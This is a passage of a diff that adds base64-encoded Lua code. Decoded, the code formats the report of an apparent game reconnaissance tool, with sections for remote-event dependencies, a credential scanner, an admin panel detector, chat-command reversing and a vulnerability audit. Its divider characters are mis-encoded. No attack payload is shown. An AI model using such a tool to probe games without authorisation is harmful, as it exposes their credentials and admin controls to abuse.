+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBwWyNwKzFdID0g',
+'IiBDT0xMRUNUSU9OU0VSVklDRSBUQUdTICAoIiAuLiAjdGFnTGlzdCAuLiAiKVxuIgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGlmICN0YWdMaXN0ID09IDAgdGhlbiBwWyNwKzFdID0gIiAgKG5vbmUpXG4iIGVs',
+'c2UgZm9yIF8sIHQgaW4gaXBhaXJzKHRhZ0xpc3QpIGRvIHBbI3ArMV0gPSAiICA+ICIgLi4gdCAuLiAiXG4iIGVuZCBlbmQKICAgIHBbI3ArMV0gPSAiXG4i',
+'CgogICAgbG9jYWwgYWxsUmVxID0ge307IGxvY2FsIHJlcU9yZGVyID0ge30KICAgIGZvciBfLCB2IGluIGlwYWlycyhyLnNjcmlwdHMpIGRvCiAgICAgICAg',
+'Zm9yIHBhdGggaW4gcGFpcnModi5yZXF1aXJlcyBvciB7fSkgZG8KICAgICAgICAgICAgaWYgbm90IGFsbFJlcVtwYXRoXSB0aGVuIGFsbFJlcVtwYXRoXSA9',
+'ICNyZXFPcmRlciArIDE7IHJlcU9yZGVyWyNyZXFPcmRlcisxXSA9IHBhdGggZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHBbI3ArMV0gPSAiw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBwWyNwKzFdID0gIiBSRVFVSVJFKCkgTU9EVUxF',
+'UyAgKCIgLi4gI3JlcU9yZGVyIC4uICIpXG4iCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgVxuIgogICAgaWYgI3JlcU9yZGVyID09IDAgdGhlbiBwWyNwKzFdID0gIiAgKG5vbmUpXG4iIGVsc2UKICAgICAgICBmb3IgXywgbW9k',
+'IGluIGlwYWlycyhyZXFPcmRlcikgZG8KICAgICAgICAgICAgcFsjcCsxXSA9ICIgID4gIiAuLiBtb2QgLi4gIlxuIgogICAgICAgICAgICBsb2NhbCBjYWxs',
+'ZXJzID0gci5tb2R1bGVSZWZzIGFuZCByLm1vZHVsZVJlZnNbbW9kXQogICAgICAgICAgICBpZiBjYWxsZXJzIGFuZCAjY2FsbGVycyA+IDAgdGhlbgogICAg',
+'ICAgICAgICAgICAgZm9yIF8sIGNhbGxlciBpbiBpcGFpcnMoY2FsbGVycykgZG8gcFsjcCsxXSA9ICIgICAgICByZXF1aXJlZCBieTogIiAuLiBjYWxsZXIg',
+'Li4gIlxuIiBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKICAgIHBbI3ArMV0gPSAiXG4iCgogICAgcFsjcCsxXSA9ICLDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIHBbI3ArMV0gPSAiIE1PRFVMRSBERVBFTkRFTkNZ',
+'IFRSRUUgICgiIC4uIHRvc3RyaW5nKHIubW9kdWxlQ291bnQgb3IgMCkgLi4gIiBtb2R1bGVzKVxuIgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGlmIG5vdCByLm1vZHVsZVJlZnMgb3Igci5tb2R1bGVDb3VudCA9',
+'PSAwIHRoZW4KICAgICAgICBwWyNwKzFdID0gIiAgKG5vbmUpXG4iCiAgICBlbHNlCiAgICAgICAgbG9jYWwgbW9kT3JkZXIgPSB7fQogICAgICAgIGZvciBr',
+'IGluIHBhaXJzKHIubW9kdWxlUmVmcykgZG8gbW9kT3JkZXJbI21vZE9yZGVyKzFdID0gayBlbmQKICAgICAgICB0YWJsZS5zb3J0KG1vZE9yZGVyKQogICAg',
+'ICAgIGZvciBfLCBtb2QgaW4gaXBhaXJzKG1vZE9yZGVyKSBkbwogICAgICAgICAgICBsb2NhbCBjYWxsZXJzID0gci5tb2R1bGVSZWZzW21vZF0KICAgICAg',
+'ICAgICAgcFsjcCsxXSA9IHN0cmluZy5mb3JtYXQoIiAgWyVkIGNhbGxlcihzKV0gJXNcbiIsICNjYWxsZXJzLCBtb2QpCiAgICAgICAgICAgIGlmICNjYWxs',
+'ZXJzIDw9IDUgdGhlbgogICAgICAgICAgICAgICAgZm9yIF8sIGMgaW4gaXBhaXJzKGNhbGxlcnMpIGRvIHBbI3ArMV0gPSAiICAgIDwtICIgLi4gYyAuLiAi',
+'XG4iIGVuZAogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICBmb3IgaSA9IDEsIDUgZG8gcFsjcCsxXSA9ICIgICAgPC0gIiAuLiBjYWxsZXJzW2ld',
+'IC4uICJcbiIgZW5kCiAgICAgICAgICAgICAgICBwWyNwKzFdID0gc3RyaW5nLmZvcm1hdCgiICAgIC4uLiArJWQgbW9yZVxuIiwgI2NhbGxlcnMgLSA1KQog',
+'ICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcFsjcCsxXSA9ICJcbiIKCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgcFsjcCsxXSA9ICIgREVQRU5ERU5DWSBHUkFQSCAgKHBlci1zY3JpcHQg',
+'c2VydmljZS9yZW1vdGUvbW9kdWxlIHRyZWUpXG4iCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgVxuIgogICAgaWYgI3Iuc2NyaXB0cyA9PSAwIHRoZW4gcFsjcCsxXSA9ICIgIChub25lKVxuIiBlbHNlCiAgICAgICAgbG9jYWwg',
+'ZGVwQ291bnQgPSAwCiAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHIuc2NyaXB0cykgZG8KICAgICAgICAgICAgbG9jYWwgZGVwcyA9IHt9CiAgICAgICAg',
+'ICAgIGlmIHYucmVtb3RlQ2FsbHMgYW5kICN2LnJlbW90ZUNhbGxzID4gMCB0aGVuCiAgICAgICAgICAgICAgICBmb3IgXywgcmMgaW4gaXBhaXJzKHYucmVt',
+'b3RlQ2FsbHMpIGRvIGRlcHNbI2RlcHMrMV0gPSAiRmlyZTogIiAuLiByYy5yZW1vdGUgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBpZiB2LnJl',
+'cXVpcmVzIGFuZCBuZXh0KHYucmVxdWlyZXMpIHRoZW4KICAgICAgICAgICAgICAgIGZvciBycCBpbiBwYWlycyh2LnJlcXVpcmVzKSBkbyBkZXBzWyNkZXBz',
+'KzFdID0gIlJlcTogIiAuLiBycCBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGlmIHYuZHluYW1pY1JlbW90ZSB0aGVuIGRlcHNbI2RlcHMrMV0g',
+'PSAiW0RZTkFNSUMgUkVNT1RFXSIgZW5kCiAgICAgICAgICAgIGlmIHYuaXNDb25maWcgdGhlbiBkZXBzWyNkZXBzKzFdID0gIltDT05GSUcgTU9EVUxFXSIg',
+'ZW5kCiAgICAgICAgICAgIGlmICNkZXBzID4gMCB0aGVuCiAgICAgICAgICAgICAgICBkZXBDb3VudCA9IGRlcENvdW50ICsgMQogICAgICAgICAgICAgICAg',
+'cFsjcCsxXSA9IHN0cmluZy5mb3JtYXQoIiAgJXMgKCVkIGRlcHMpXG4iLCB2LnBhdGgsICNkZXBzKQogICAgICAgICAgICAgICAgZm9yIF8sIGQgaW4gaXBh',
+'aXJzKGRlcHMpIGRvIHBbI3ArMV0gPSAiICAgICstLSAiIC4uIGQgLi4gIlxuIiBlbmQKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYg',
+'ZGVwQ291bnQgPT0gMCB0aGVuIHBbI3ArMV0gPSAiICAobm8gZGVwZW5kZW5jaWVzIGZvdW5kKVxuIiBlbmQKICAgIGVuZAogICAgcFsjcCsxXSA9ICJcbiIK',
+'CiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgcFsjcCsx',
+'XSA9ICIgSU5TVEFOQ0UgUkVMQVRJT05TSElQIE1BUFxuIgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGxvY2FsIHJlbENvdW50ID0gKCNyLmRldGVjdG9ycykgKyAoI3IucHJvbXB0UGFyZW50cykgKyAoI3IuYnV0',
+'dG9ucykKICAgIGlmIHJlbENvdW50ID09IDAgdGhlbiBwWyNwKzFdID0gIiAgKG5vbmUpXG4iIGVsc2UKICAgICAgICBpZiAjci5kZXRlY3RvcnMgPiAwIHRo',
+'ZW4KICAgICAgICAgICAgcFsjcCsxXSA9ICIgIENMSUNLIERFVEVDVE9SUzpcbiIKICAgICAgICAgICAgZm9yIF8sIGQgaW4gaXBhaXJzKHIuZGV0ZWN0b3Jz',
+'KSBkbyBwWyNwKzFdID0gIiAgICAiIC4uIGQgLi4gIlxuIiBlbmQKICAgICAgICBlbmQKICAgICAgICBpZiAjci5wcm9tcHRQYXJlbnRzID4gMCB0aGVuCiAg',
+'ICAgICAgICAgIHBbI3ArMV0gPSAiICBQUk9YSU1JVFkgUFJPTVBUUzpcbiIKICAgICAgICAgICAgZm9yIF8sIGQgaW4gaXBhaXJzKHIucHJvbXB0UGFyZW50',
+'cykgZG8gcFsjcCsxXSA9ICIgICAgIiAuLiBkIC4uICJcbiIgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgI3IuYnV0dG9ucyA+IDAgdGhlbgogICAgICAg',
+'ICAgICBsb2NhbCBiQ291bnQgPSBtYXRoLm1pbigjci5idXR0b25zLCAyMCkKICAgICAgICAgICAgcFsjcCsxXSA9ICIgIEJVVFRPTlMgKGlsayAiIC4uIGJD',
+'b3VudCAuLiAiKTpcbiIKICAgICAgICAgICAgZm9yIGkgPSAxLCBiQ291bnQgZG8gcFsjcCsxXSA9ICIgICAgIiAuLiByLmJ1dHRvbnNbaV0gLi4gIlxuIiBl',
+'bmQKICAgICAgICAgICAgaWYgI3IuYnV0dG9ucyA+IGJDb3VudCB0aGVuIHBbI3ArMV0gPSAiICAgIC4uLiArIiAuLiAoI3IuYnV0dG9ucyAtIGJDb3VudCkg',
+'Li4gIiBtb3JlXG4iIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICBwWyNwKzFdID0gIlxuIgoKICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBwWyNwKzFdID0gIiBDUkVERU5USUFMIFNDQU5ORVIgICgiIC4uICNy',
+'LmNyZWRzIC4uICIgZmluZGluZ3MpXG4iCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgVxuIgogICAgaWYgI3IuY3JlZHMgPT0gMCB0aGVuIHBbI3ArMV0gPSAiICAobm9uZSlcbiIgZWxzZQogICAgICAgIGZvciBfLCB2IGluIGlw',
+'YWlycyhyLmNyZWRzKSBkbyBwWyNwKzFdID0gIiAgPiAiIC4uIHYgLi4gIlxuIiBlbmQKICAgIGVuZAogICAgcFsjcCsxXSA9ICJcbiIKCiAgICBwWyNwKzFd',
+'ID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgcFsjcCsxXSA9ICIgQURNSU4g',
+'UEFORUwgREVURUNUT1IgICgiIC4uICNyLmFkbWluUGFuZWxzIC4uICIgcGFuZWxzKVxuIgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGlmICNyLmFkbWluUGFuZWxzID09IDAgdGhlbiBwWyNwKzFdID0gIiAgKG5v',
+'bmUpXG4iIGVsc2UKICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoci5hZG1pblBhbmVscykgZG8gcFsjcCsxXSA9ICIgID4gIiAuLiB2IC4uICJcbiIgZW5k',
+'CiAgICBlbmQKICAgIHBbI3ArMV0gPSAiXG4iCgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoFcbiIKICAgIHBbI3ArMV0gPSAiIENIQVQgQ09NTUFORCBSRVZFUlNJTkcgICgiIC4uICNyLmNoYXRDbWRzIC4uICIgY29tbWFuZHMp',
+'XG4iCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgaWYg',
+'I3IuY2hhdENtZHMgPT0gMCB0aGVuIHBbI3ArMV0gPSAiICAobm9uZSlcbiIgZWxzZQogICAgICAgIGxvY2FsIHNlZW4gPSB7fQogICAgICAgIGZvciBfLCB2',
+'IGluIGlwYWlycyhyLmNoYXRDbWRzKSBkbwogICAgICAgICAgICBpZiBub3Qgc2Vlblt2XSB0aGVuIHNlZW5bdl0gPSB0cnVlOyBwWyNwKzFdID0gIiAgPiAi',
+'IC4uIHYgLi4gIlxuIiBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcFsjcCsxXSA9ICJcbiIKCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgcFsjcCsxXSA9ICIgVlVMTkVSQUJJTElUWSBBVURJVCAgKCIgLi4g',
